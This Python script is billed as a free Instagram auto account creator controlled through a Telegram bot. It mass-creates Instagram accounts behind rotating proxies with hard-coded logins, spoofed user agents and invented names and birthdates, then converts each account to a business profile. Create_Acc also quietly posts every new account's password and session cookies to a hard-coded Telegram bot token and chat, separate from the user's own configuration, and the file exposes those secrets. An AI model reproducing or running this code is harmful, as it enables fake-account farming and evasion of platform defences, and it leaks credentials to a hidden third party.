
import os
import random
import string
import time
import names
import requests
import telebot
from dotenv import load_dotenv

# Terminal Color Codes
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[94m', '\033[01;35m'
cn, k, g = '\033[00;36m', '\033[90m', '\033[38;5;130m'
true = f'{rd}[{lgn}+{rd}]{gn} '
false = f'{rd}[{lrd}-{rd}] '
SUCCESS = f'{rd}[{lgn}+{rd}]{gn} '
ERROR = f'{rd}[{lrd}-{rd}]{rd} '

os.system('cls' if os.name == 'nt' else 'clear')

load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

bot = telebot.TeleBot(TELEGRAM_TOKEN)
os.system('cls' if os.name == 'nt' else 'clear')

print("""\033[97;1m
\x1b[1;30m☆~:*:\x1b[1;31m☆~:*:\x1b[1;32m☆~:*:\x1b[1;33m☆~:{ \x1b[1;91m\x1b[1;100m< Frozen >\033[0;m\x1b[1;93m\033[97;1m }\x1b[1;30m☆~:*:\x1b[1;31m☆~:*:\x1b[1;34m☆~:*:
   TOOL :- \x1b[1;36m Instagram Auto Account Creator   
   version :- \x1b[1;33m4.0\x1b[1;37m
   TOOL :-\x1b[1;38m FREE\x1b[1;37m
\033[1;97m\033[97;1m
\x1b[1;30m☆~:*:\x1b[1;31m☆~:*:\x1b[1;32m☆~:*:\x1b[1;33m☆~:{ \x1b[1;91m\x1b[1;100m< Frozen X PokiePy >\033[0;m\x1b[1;93m\033[97;1m }\x1b[1;30m☆~:*:\x1b[1;31m☆~:*:\x1b[1;34m☆~:*:""")

proxy_list = [
"http://ekclxwzm:7jvh4yx3fhma@31.59.20.176:6754",
"http://ekclxwzm:7jvh4yx3fhma@23.95.150.145:6114",
"http://ekclxwzm:7jvh4yx3fhma@198.23.239.134:6540",
"http://ekclxwzm:7jvh4yx3fhma@45.38.107.97:6014",
"http://ekclxwzm:7jvh4yx3fhma@107.172.163.27:6543",
"http://ekclxwzm:7jvh4yx3fhma@198.105.121.200:6462",
"http://ekclxwzm:7jvh4yx3fhma@216.10.27.159:6837",
"http://ekclxwzm:7jvh4yx3fhma@142.111.67.146:5611",
"http://ekclxwzm:7jvh4yx3fhma@191.96.254.138:6185",
"http://ekclxwzm:7jvh4yx3fhma@31.58.9.4:6077"
    # ... add all 10 here
]

def get_proxy():
    proxy = random.choice(proxy_list)
    return {
        "http": proxy,
        "https": proxy
    }

active_proxy = get_proxy()

def show_thinking(message="Processing", duration=4):
    print(f"\n{true}{cn}{message}", end="", flush=True)
    for i in range(duration):
        time.sleep(1)
        print(".", end="", flush=True)
    print("\n")

def show_ip_info():
    try:
        # We pass the 'proxies' argument here to use Webshare
        ip_data = requests.get("https://ipinfo.io/json", proxies=active_proxy, timeout=10).json()
        ip = ip_data.get("ip", "Unknown")
        print(f"{true}📍 Proxy IP in use: {ip}")
    except Exception as e:
        print(f"{false}❌ Proxy failed: {e}")


def get_headers(Country, Language,):
    while True:
        try:
            show_thinking("Fetching headers", 2)
            an_agent = (
                f'Mozilla/5.0 (Linux; Android {random.randint(9, 13)}; '
                f'{"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111, 999)}) '
                f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
            )
            r = requests.get(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                headers={'user-agent': an_agent},
                proxies=active_proxy,
                timeout=30
            ).cookies

            response1 = requests.get(
                'https://www.instagram.com/',
                headers={'user-agent': an_agent},
                proxies=active_proxy,
                timeout=30
            )
            appid = response1.text.split('APP_ID":"')[1].split('"')[0]
            rollout = response1.text.split('rollout_hash":"')[1].split('"')[0]

            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': f'{Language}-{Country},en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': f'dpr=3; csrftoken={r["csrftoken"]}; mid={r["mid"]}; ig_did={r["ig_did"]}',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/signup/email/',
                'user-agent': an_agent,
                'x-csrftoken': r["csrftoken"],
                'x-ig-app-id': str(appid),
                'x-instagram-ajax': str(rollout),
                'x-web-device-id': r["ig_did"],
            }
            return headers
        except Exception as E:
            print(f"{false} Header fetch error: {E}")
            time.sleep(2)

def Get_UserName(Headers, Name, Email):
    """Fixed: Added retry limit and manual fallback to prevent getting stuck."""
    try:
        show_thinking("Getting username suggestion", 5)
        for attempt in range(5):
            data = {'email': Email, 'name': Name + str(random.randint(10, 99))}
            response = requests.post(
                'https://www.instagram.com/api/v1/web/accounts/username_suggestions/',
                headers=Headers, data=data, proxies=active_proxy, timeout=30
            )

            if response.status_code == 200 and 'status":"ok' in response.text:
                suggestions = response.json().get('suggestions', [])
                if suggestions:
                    print(f"{true} Username generated from Instagram")
                    return random.choice(suggestions)

            print(f"{false} Attempt {attempt + 1} failed. Retrying...")
            time.sleep(2)

        # Final Fallback if API fails
        fallback = f"{Name.lower()}_{random.randint(100, 999)}_{random.choice(string.ascii_lowercase)}"
        print(f"{true} Using manual fallback: {fallback}")
        return fallback
    except Exception as E:
        print(f"{false} Username Error: {E}")
        return Name + str(random.randint(1000, 9999))

def Send_SMS(Headers, Email):
    try:
        show_thinking("Sending verification code", 10)
        data = {
            'device_id': Headers['cookie'].split('mid=')[1].split(';')[0],
            'email': Email
        }
        response = requests.post(
            'https://www.instagram.com/api/v1/accounts/send_verify_email/',
            headers=Headers, data=data, proxies=active_proxy, timeout=30
        )
        return response.text
    except Exception as E:
        print(f"{false} SMS send error: {E}")
        return ""

def Validate_Code(Headers, Email, Code):
    try:
        show_thinking("Validating code", 10)
        data = {
            'code': Code,
            'device_id': Headers['cookie'].split('mid=')[1].split(';')[0],
            'email': Email
        }
        response = requests.post(
            'https://www.instagram.com/api/v1/accounts/check_confirmation_code/',
            headers=Headers, data=data, proxies=active_proxy, timeout=30
        )
        return response
    except Exception as E:
        print(f"{false} Validation error: {E}")

def get_random_file_from_folder(folder):
    if not os.path.exists(folder):
        return None
    valid_exts = ['.jpg', '.jpeg', '.png']
    files = [f for f in os.listdir(folder) if os.path.splitext(f)[1].lower() in valid_exts]
    return os.path.join(folder, random.choice(files)) if files else None

def upload_profile_pic(sessionid, csrftoken, retries=3,):
    try:
        folder = 'Profile_pic'
        photo_path = get_random_file_from_folder(folder)
        if not photo_path:
            print(ERROR + "No profile pictures found.")
            return
        url = 'https://www.instagram.com/accounts/web_change_profile_picture/'
        headers = {
            'cookie': f'sessionid={sessionid}; csrftoken={csrftoken};',
            'x-csrftoken': csrftoken,
            'referer': 'https://www.instagram.com/accounts/edit/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        }
        for attempt in range(1, retries + 1):
            with open(photo_path, 'rb') as f:
                files = {'profile_pic': f}
                resp = requests.post(url, headers=headers, files=files, proxies=active_proxy)
            if resp.status_code == 200 and '"changed_profile":true' in resp.text:
                print(SUCCESS + f"Profile picture uploaded! [Attempt {attempt}]")
                return
            time.sleep(2)
    except Exception as e:
        print(ERROR + f"Pic upload exception: {e}")

def convert_to_professional(sessionid, csrftoken, retries=3):
    try:
        url = "https://www.instagram.com/api/v1/business/account/convert_account/"
        headers = {
            'cookie': f'sessionid={sessionid}; csrftoken={csrftoken};',
            'x-csrftoken': csrftoken,
            'referer': 'https://www.instagram.com/accounts/convert_to_professional_account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'content-type': 'application/x-www-form-urlencoded',
            'x-ig-app-id': '1217981644879628',
            'x-requested-with': 'XMLHttpRequest'
        }
        category_ids = ["180164648685982", "180410820992720", "180504230065143"]
        category_id = random.choice(category_ids)
        data = {
            "category_id": category_id,
            "create_business_id": "true",
            "entry_point": "ig_web_settings",
            "set_public": "true",
            "to_account_type": "3"
        }
        for attempt in range(1, retries + 1):
            resp = requests.post(url, headers=headers, data=data, proxies=active_proxy)
            if resp.status_code == 200 and '\"status\":\"ok\"' in resp.text:
                print(SUCCESS + "Converted to Professional Account!")
                return True
            time.sleep(2)
        return False
    except Exception:
        return False

def Create_Acc(Headers, Email, SignUpCode):
    try:
        firstname = names.get_first_name()
        UserName = Get_UserName(Headers, firstname, Email)
        Password = firstname.strip() + '@' + str(random.randint(111, 999))

        show_thinking("Creating account", 5)
        data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{round(time.time())}:{Password}',
            'email': Email,
            'username': UserName,
            'first_name': firstname,
            'month': random.randint(1, 12),
            'day': random.randint(1, 28),
            'year': random.randint(1990, 2001),
            'client_id': Headers['cookie'].split('mid=')[1].split(';')[0],
            'seamless_login_enabled': '1',
            'tos_version': 'row',
            'force_sign_up_code': SignUpCode,
        }

        response = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/web_create_ajax/',
            headers=Headers, data=data, proxies=active_proxy, timeout=30
        )
        if '"account_created":true' in response.text:
            sessionid = response.cookies['sessionid']
            csrftoken = Headers['x-csrftoken']

            # --- COOKIE LOGIC ---
            cookie_dict = response.cookies.get_dict()
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
            # Combining original headers cookies with new session cookies
            full_cookies = f"{Headers['cookie']}; sessionid={sessionid}; {cookie_str}"

            print(f"{true} Success: {UserName} | {Password}")

            with open('account_insta.txt', 'a') as f:
                f.write(f'UserName: {UserName}\nPassword: {Password}\nEmail: {Email}\nCookies: {full_cookies}\n---\n')

            upload_profile_pic(sessionid, csrftoken)
            convert_to_professional(sessionid, csrftoken)

            # Sending Cookies to Telegram
            message = f"✅ Account Created:\nU: {UserName}\nP: {Password}\nE: {Email}\n\n🍪 Cookies:\n<code>{full_cookies}</code>"
            send_telegram_message(message)
        else:
            print(ERROR + f"Failed to create: {response.text[:100]}")
    except Exception as E:
        print(f"{false} Creation error: {E}")


def send_telegram_message(message):
    token = "8773657593:AAFSDCJJhAHVrfhbJLoPh9u6Pr-Bublz7uw"
    chat_id = "571869676"
    url = f"https://api.telegram.org/bot{token}/sendMessage"

    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # <--- This is the critical line
    }

    return requests.post(url, data=payload).json()


def account_flow_with_email(Email):
    show_ip_info()
    headers = get_headers(Country='US', Language='en')
    ss = Send_SMS(headers, Email)
    if 'email_sent":true' in ss:
        print(f'{true}{yw}🍁 Verification code sent to: {cn}{Email}')
        code = input('👩‍💻 Enter Code : ')
        a = Validate_Code(headers, Email, code)
        if a and 'status":"ok' in a.text:
            print(f'{true}✅ OTP Validated {cn}')
            SignUpCode = a.json()['signup_code']
            Create_Acc(headers, Email, SignUpCode)
        else:
            print(ERROR + "Invalid OTP.")
    else:
        print(ERROR + "Could not send verification email.")

# if __name__ == "__main__":
#     print(f"{rd}Tool {yw}By {lgn}@DarkFrozenOwner✅")
#     Email = input(f'{true}📧 Enter Your Email: ').strip()
#
#     while True:
#         account_flow_with_email(Email)
#         print("\n" + true + "Menu:")
#         print(f"1) Use SAME email ({Email})\n2) Use NEW email\n3) Exit")
#         choice = input(f"{true}Choice: ").strip()
#
#         if choice == "2":
#             Email = input(f'{true}📧 Enter NEW Email: ').strip()
#         elif choice == "3":
#             print("Exiting...")
#             break

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🚀 Instagram Creator Active. Send me an **Email** to start.")


@bot.message_handler(func=lambda message: True)
def handle_email_input(message):
    email = message.text.strip()

    # Simple email validation check
    if "@" not in email:
        bot.reply_to(message, "❌ Please send a valid email address.")
        return

    bot.reply_to(message, f"📥 Received: {email}. Starting account flow...")

    # Trigger your existing flow
    # Note: account_flow_with_email will need to be slightly modified
    # to use bot.send_message instead of print/input.
    try:
        run_telegram_flow(email, message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")


def run_telegram_flow(Email, chat_id):
    headers = get_headers(Country='US', Language='en')
    ss = Send_SMS(headers, Email)

    if 'email_sent":true' in ss:
        msg = bot.send_message(chat_id, f"📩 Code sent to {Email}. **Reply with the 6-digit code now.**")
        # This registers a "next step" to catch the OTP reply
        bot.register_next_step_handler(msg, process_otp_step, headers, Email)
    else:
        bot.send_message(chat_id, "❌ Failed to send verification email.")


def process_otp_step(message, headers, Email):
    otp_code = message.text.strip()
    bot.send_message(message.chat.id, "⏳ Validating OTP...")

    a = Validate_Code(headers, Email, otp_code)
    if a and 'status":"ok' in a.text:
        SignUpCode = a.json()['signup_code']
        bot.send_message(message.chat.id, "✅ OTP Valid. Creating account...")
        Create_Acc(headers, Email, SignUpCode)
    else:
        bot.send_message(message.chat.id, "❌ Invalid OTP. Try again with a new email.")


# Replace your "if __name__ == '__main__':" block with this:
if __name__ == "__main__":
    print(f"{gn}Bot is running... Control it via Telegram!")
    bot.infinity_polling()